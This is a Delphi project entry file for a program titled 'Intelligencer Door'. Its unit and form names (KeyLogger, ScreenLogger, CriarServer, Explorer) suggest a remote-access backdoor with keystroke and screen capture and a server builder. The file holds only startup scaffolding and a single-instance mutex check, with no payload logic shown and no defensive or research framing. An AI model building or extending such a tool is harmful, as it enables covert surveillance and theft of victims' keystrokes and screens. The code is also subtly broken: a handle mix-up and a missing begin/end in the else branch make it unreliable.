program ID;

uses
  Forms,
  Windows,
  UID in 'UID.pas' {Frm33585IDPrincipal},
  UKL in 'UKL.pas' {FrmKeyLogger},
  UCS in 'UCS.pas' {FrmCriarServer},
  UFM in 'UFM.pas' {FrmExplorer},
  USL in 'USL.pas' {FrmScreenLogger},
  UDG in 'UDG.pas' {FrmDiagnostico};

{$R *.res}

var
  vMutex: THandle;
begin
  vMutex := OpenMutex(MUTEX_ALL_ACCESS, False, 'Frm33585IDPrincipal');
  if (vMutex = 0) then
  begin
    vMutex := CreateMutex(nil, False, 'Frm33585IDPrincipal');
    Application.Initialize;
    Application.Title := 'Intelligencer Door';
    Application.CreateForm(TFrm33585IDPrincipal, Frm33585IDPrincipal);
    Application.CreateForm(TFrmKeyLogger, FrmKeyLogger);
    Application.CreateForm(TFrmCriarServer, FrmCriarServer);
    Application.CreateForm(TFrmExplorer, FrmExplorer);
    Application.CreateForm(TFrmScreenLogger, FrmScreenLogger);
    Application.CreateForm(TFrmDiagnostico, FrmDiagnostico);
    Application.Run;
  end else
    ShowWindow(vMutex, SW_RESTORE);
    SetForegroundWindow(vMutex);
end.
